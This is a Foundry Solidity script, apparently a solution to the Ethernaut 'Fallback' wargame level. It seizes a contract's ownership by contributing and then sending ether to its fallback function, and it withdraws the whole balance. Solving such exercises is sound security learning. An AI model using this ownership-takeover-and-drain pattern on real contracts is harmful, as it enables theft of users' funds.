// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/Fallback.sol";

contract FallbackScript is Script {
    Fallback target;
    address owner;
    address p;

    function setUp() public {
        target = Fallback(payable(0xB9a44591A427B246ACC23B74ee4F86A75e30242D));
        owner = target.owner();
        p = vm.envAddress("ADDR");
    }

    function run() public {
        vm.startBroadcast();

        console.log("before owner: ", owner);
        target.contribute{value: 1}();
        address(target).call{value: 1}("");
        // change owner
        console.log("after owner: ", owner);
        console.log("before contract balance: ", address(target).balance);
        // withdraw owner balance
        target.withdraw();
        console.log("after contract balance: ", address(target).balance);

        vm.stopBroadcast();
    }
}
